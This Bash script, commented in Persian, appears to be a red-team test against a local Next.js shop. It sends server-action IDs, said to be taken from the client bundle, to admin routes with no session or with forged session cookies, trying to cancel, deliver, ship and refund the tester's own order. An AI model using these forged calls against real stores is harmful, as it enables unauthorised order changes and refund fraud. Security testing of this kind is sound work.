#!/usr/bin/env bash
# حملهٔ ۳ (redteam-60) — دستکاری وضعیت سفارش از بیرون، بدون cred ادمین
# بردار: استخراج Server Action ID از باندل (شبیه‌سازی بدترین حالت نشت)
#        → فراخوانی مستقیم اکشن‌های ادمین بدون نشست / با کوکی جعلی
set -u
OUT="$(dirname "$0")/attack3-results.txt"
: > "$OUT"
MYORDER="cmuidv5k60003ndh1lv8nqwjj"   # سفارشِ خودم (redteam-60) — فقط دیتای خودم
TRANS=40203364a06391be9688e5f6ed677454d4a174b9f4
SHIP=40e87d099172bb7cf7579728136cff36b2521ee0b8
REFUND=4030c2b324f6eef32641653e65f64c78400a3c951d

probe() { # name url id body extra_headers...
  local name="$1" url="$2" id="$3" body="$4" cookie="${5:-}"
  local ck=()
  [ -n "$cookie" ] && ck=(-H "Cookie: $cookie")
  {
    echo "## $name"
    curl -s -o /tmp/a3-body.txt -w "http=%{http_code} ct=%{content_type}\n" -X POST "$url" \
      -H "Next-Action: $id" -H "Content-Type: text/plain;charset=UTF-8" "${ck[@]}" --data "$body"
    head -c 400 /tmp/a3-body.txt; echo; echo "--"
  } >> "$OUT"
}

probe "1 transitionOrderAction→CANCELLED بدون نشست"   "http://localhost:3000/admin/orders" "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"CANCELLED\"}]"
probe "2 transitionOrderAction→DELIVERED بدون نشست"   "http://localhost:3000/admin/orders" "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
probe "3 shipOrderAction بدون نشست"                   "http://localhost:3000/admin/orders" "$SHIP"  "[{\"orderId\":\"$MYORDER\"}]"
probe "4 refundOrderAction بدون نشست"                 "http://localhost:3000/admin/orders" "$REFUND" "[{\"orderId\":\"$MYORDER\",\"amountIrt\":1000,\"reason\":\"redteam-60\"}]"
probe "5 transitionOrderAction با کوکی جلسهٔ جعلی"     "http://localhost:3000/admin/orders" "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"CANCELLED\"}]" "prima_session=forged.redteam.60; prima_admin_session=forged.redteam.60"
probe "6 transitionOrderAction مسیر جایگزین /checkout" "http://localhost:3000/checkout"     "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"CANCELLED\"}]"
echo "=== ATTACK 3 RESULTS ==="
cat "$OUT"
